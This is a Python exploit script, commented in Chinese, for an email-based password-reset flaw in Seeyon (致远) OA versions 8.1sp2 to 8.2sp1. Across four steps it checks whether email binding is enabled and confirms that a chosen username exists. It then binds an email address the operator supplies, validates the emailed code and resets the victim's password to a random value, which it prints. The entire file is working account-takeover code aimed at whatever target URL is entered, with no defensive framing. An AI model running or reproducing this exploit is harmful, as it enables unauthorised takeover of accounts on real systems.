#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
致远 OA 邮件重置密码漏洞利用脚本
"""

import requests
import time
import re
import random
import string
import os
import sys
from PIL import Image

# 配置
TIMEOUT = 10
VERIFY_SSL = False
# 禁用 SSL 警告
requests.packages.urllib3.disable_warnings()

# 会话对象（保持 Cookie）
session = requests.Session()
session.verify = VERIFY_SSL


def get_unix_timestamp():
    """返回当前 Unix 时间戳"""
    return int(time.time())


def random_str(length):
    """生成随机字符串"""
    return ''.join(random.sample(string.ascii_letters + string.digits, length))


def get_qrcode(url):
    """
    获取验证码图片，显示并要求用户输入
    返回输入的验证码字符串
    """
    ts = str(get_unix_timestamp())
    img_url = f"{url}/seeyon/verifyCodeImage.jpg"
    headers = {
        "Referer": f"{url}/seeyon/main.do?method=main",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"
    }
    try:
        r = session.get(img_url, headers=headers, timeout=TIMEOUT)
        if r.status_code != 200:
            print("[-] 获取验证码图片失败")
            return None
        # 保存临时文件
        img_name = ts + '.png'
        with open(img_name, 'wb') as f:
            f.write(r.content)
        # 显示图片（简易方式：打开图片）
        image = Image.open(img_name)
        image.show()
        # 等待用户查看并输入
        code = input("[+] 请输入验证码(4位)：").strip()
        image.close()
        os.remove(img_name)
        if len(code) != 4:
            print("[-] 验证码长度必须为4")
            return None
        return code
    except Exception as e:
        print(f"[-] 获取验证码异常: {e}")
        return None


def check_ifcanuseSMSorEmail(url):
    """检查是否可以使用短信或邮件重置密码（仅打印信息）"""
    try:
        resp = requests.get(f"{url}/seeyon/rest/password/retrieve/canUseSMS",
                            timeout=TIMEOUT, verify=VERIFY_SSL)
        print(f'[+] 是否可以使用 SMS：{resp.json().get("data")}')
        resp = requests.get(f"{url}/seeyon/rest/password/retrieve/canUseEmail",
                            timeout=TIMEOUT, verify=VERIFY_SSL)
        print(f'[+] 是否可以使用 Email：{resp.json().get("data")}')
    except Exception as e:
        print(f"[+] 获取 SMS/Email 状态失败: {e}")


def isCanUse(url):
    """判断是否开启邮件或短信绑定功能"""
    try:
        req = requests.get(f"{url}/seeyon/personalBind.do?method=isCanUse",
                           timeout=TIMEOUT, verify=VERIFY_SSL)
        return "true" in req.text
    except:
        return False


def personalBind_one(url, username, verifycode):
    """
    第一步：通过用户名获取绑定信息，同时验证图片验证码
    """
    data = {
        "method": "getBindTypeByLoginName",
        "loginName": username,
        "img_verifyCode": verifycode
    }
    headers = {
        "Referer": f"{url}/seeyon/main.do?method=main",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"
    }
    try:
        resp = session.post(f"{url}/seeyon/personalBind.do",
                            data=data, headers=headers, timeout=TIMEOUT)
        rjson = resp.json()
        # 如果验证码错误，重新获取验证码并重试
        if rjson.get('imgCodeEquals') != 'true':
            print("[!] 验证码错误，重新获取...")
            new_code = get_qrcode(url)
            if new_code:
                return personalBind_one(url, username, new_code)
            return False
        if rjson.get('memberIsExist') == 'true':
            print("[+] 用户名存在，绑定信息获取成功")
            return True
        else:
            print("[-] 用户不存在")
            return False
    except Exception as e:
        print(f"[-] 请求异常: {e}")
        return False


def personalBind_two(url, email, verifycode):
    """
    第二步：发送邮箱验证码
    """
    data = {
        "method": "sendVerificationCodeToBindEmail",
        "type": "bind",
        "verifyImageCode": verifycode,
        "email": email
    }
    headers = {
        "Referer": f"{url}/seeyon/main.do?method=main",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"
    }
    try:
        resp = session.post(f"{url}/seeyon/personalBind.do",
                            data=data, headers=headers, timeout=TIMEOUT)
        if resp.json().get('verifyImageCodeEquals') == 'true':
            print("[+] 发送邮箱验证码成功")
            return True
        else:
            print("[-] 发送邮箱验证码失败")
            return False
    except Exception as e:
        print(f"[-] 请求异常: {e}")
        return False


def personalBind_three(url, emailcode):
    """
    第三步：验证邮箱验证码
    """
    data = {
        "method": "validateVerificationCode",
        "verificationCode": emailcode,
    }
    headers = {
        "Referer": f"{url}/seeyon/main.do?method=main",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"
    }
    try:
        resp = session.post(f"{url}/seeyon/personalBind.do",
                            data=data, headers=headers, timeout=TIMEOUT)
        if resp.json().get('equals') == 'true':
            print("[+] 邮箱验证码验证成功")
            return True
        else:
            print("[-] 邮箱验证码错误")
            return False
    except Exception as e:
        print(f"[-] 请求异常: {e}")
        return False


def individualManager(url):
    """
    第四步：重置密码
    """
    new_password = random_str(10) + "@Aa"
    data = {
        "method": "resetPassword",
        "nowpwd": new_password
    }
    headers = {
        "Referer": f"{url}/seeyon/main.do?method=main",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"
    }
    try:
        resp = session.post(f"{url}/seeyon/individualManager.do",
                            data=data, headers=headers, timeout=TIMEOUT)
        if "true" in resp.text:
            print(f"[+] 密码重置成功，新密码为: {new_password}")
            return True
        else:
            print("[-] 重置密码失败")
            return False
    except Exception as e:
        print(f"[-] 请求异常: {e}")
        return False


def main():
    print("致远 OA 邮件重置密码漏洞 (v8.1sp2 / v8.2 / v8.2sp1)")
    url = input("请输入目标 URL (例如 http://192.168.1.100:8080): ").strip().rstrip('/')
    if not url:
        print("[-] URL 不能为空")
        sys.exit(1)

    # 检查是否可以使用邮件/SMS
    check_ifcanuseSMSorEmail(url)
    if not isCanUse(url):
        print("[-] 目标未开启邮件或短信绑定功能，无法利用")
        sys.exit(1)

    # 第一步：输入用户名并验证
    username = input("[+] 请输入用户名: ").strip()
    if not username:
        print("[-] 用户名不能为空")
        sys.exit(1)

    # 获取验证码
    code = get_qrcode(url)
    if not code:
        print("[-] 获取验证码失败")
        sys.exit(1)

    if not personalBind_one(url, username, code):
        print("[-] 第一步验证失败")
        sys.exit(1)

    # 第二步：发送邮箱验证码
    code = get_qrcode(url)   # 新的验证码
    if not code:
        print("[-] 获取验证码失败")
        sys.exit(1)

    email = input("[+] 请输入接收验证码的邮箱地址: ").strip()
    if not email:
        print("[-] 邮箱不能为空")
        sys.exit(1)

    if not personalBind_two(url, email, code):
        print("[-] 第二步发送邮件失败")
        sys.exit(1)

    # 第三步：验证邮箱验证码
    email_code = input("[+] 请输入邮箱中收到的验证码: ").strip()
    if not email_code:
        print("[-] 验证码不能为空")
        sys.exit(1)

    if not personalBind_three(url, email_code):
        print("[-] 第三步验证码错误")
        sys.exit(1)

    # 第四步：重置密码
    if not individualManager(url):
        print("[-] 第四步重置密码失败")
        sys.exit(1)

    print("[+] 漏洞利用完成！")


if __name__ == "__main__":
    main()